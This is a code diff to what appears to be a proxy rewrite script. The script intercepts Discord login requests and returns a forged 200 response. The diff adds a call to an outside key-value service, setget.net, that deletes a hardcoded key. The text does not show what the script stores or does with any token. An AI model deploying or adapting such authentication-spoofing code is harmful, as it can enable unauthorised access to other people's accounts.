@@ -2,6 +2,15 @@ const url = $request.url;
 
 const KEY = "nfnjksfhjkdsjfejfjekrngiernvcc";
 
+function clearSetget() {
+    $httpClient.delete({
+        url: `https://setget.net/delete/${KEY}`
+    }, function(error, response, body) {
+        console.log("clear:", error || "OK");
+    });
+}
+
+
 if (
     $request.method === "POST" &&
     url === "https://discord.com/api/v9/auth/login"
@@ -31,6 +40,8 @@ if (
                         theme: "dark"
                     }
                 };
+
+                clearSetget();
 
                 $done({
                     status: 200,
